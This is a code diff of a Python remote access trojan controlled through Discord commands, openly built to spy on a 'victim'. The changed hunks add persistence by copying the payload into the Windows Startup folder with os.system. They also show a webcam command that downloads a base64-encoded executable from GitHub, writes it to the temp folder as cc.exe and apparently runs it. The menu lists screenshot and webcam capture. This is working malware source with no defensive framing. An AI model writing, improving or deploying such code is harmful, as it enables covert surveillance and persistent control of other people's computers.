@@ -110,29 +110,25 @@ async def geolocate(ctx):
     embed.set_footer(text="Written by NullCode#7040")
     await ctx.send(embed=embed)
 
-# Initial startup command
+# Put payload in startup directory
 @client.command()
 async def startup(ctx):
-    from sys import executable
-    await ctx.send("Last known RAT directory: `" + ogdir + "` \nCurrent Directory: `" + os.getcwd() + "`")
+    from sys import executable; msg = "```\n"
+    await ctx.send(embed = discord.Embed(title = "Last known RAT directory: \n" + ogdir, color = 0x0081FA))
+    await ctx.send(embed = discord.Embed(title = "Current Directory: \n" + os.getcwd(), color = 0x0081FA))
     os.chdir(ogdir)
-    await ctx.send("\nTrying to copy self into startup directory...")
+    await ctx.send(embed = discord.Embed(title = "Trying to copy payload into startup directory...", color = 0x0081FA))
     modded_startup = os.path.basename(executable)
-    print('copy "' + modded_startup + '" "' + os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" + '"')
     os.system('copy "' + modded_startup + '" "' + os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" + '"')
     os.chdir(os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
-    await ctx.send("If you see the program here, you're good to go: " + str(os.listdir()))
+    await ctx.send(embed = discord.Embed(title = "If you see the program here, you're good to go: ", color = 0x0081FA))
+    for value in os.listdir(): msg += f'{value}\n'
+    msg += "```"; await ctx.send(msg)
     
 @client.command()  # Idea was Sp00p's, but this is a brand new implementation by me
 async def webcam(ctx):
     import base64
-
-    webcam = bytes(
-        get(
-            "https://raw.githubusercontent.com/NullCode13/CommandCam/master/CommandCam_binary_base64"
-        ).text,
-        "utf-8",
-    )
+    webcam = bytes(get("https://raw.githubusercontent.com/NullCode13/CommandCam/master/CommandCam_binary_base64").text, "utf-8")
     os.chdir(os.getenv("temp"))
     with open("cc.exe", "wb") as fh:
         fh.write(base64.decodebytes(webcam))
@@ -336,7 +332,7 @@ async def menu(ctx):
     embed.add_field(name="rat> cwd", value="Sends current working directory", inline=False)
     embed.add_field(name="rat> screenshot", value="Takes screenshot of monitor", inline=False)
     embed.add_field(name="rat> webcam", value="Takes picture from webcam", inline=False)
-    embed.add_field(name="rat> startup", value="[EXPERIMENTAL] Add payload to victim's startup", inline=False)
+    embed.add_field(name="rat> startup", value="Add payload to victim's startup", inline=False)
     embed.add_field(name="rat> exit <ip>", value="Shuts down bot", inline=False)
     embed.set_footer(text="Written by NullCode#7040")
     await ctx.send(embed=embed)
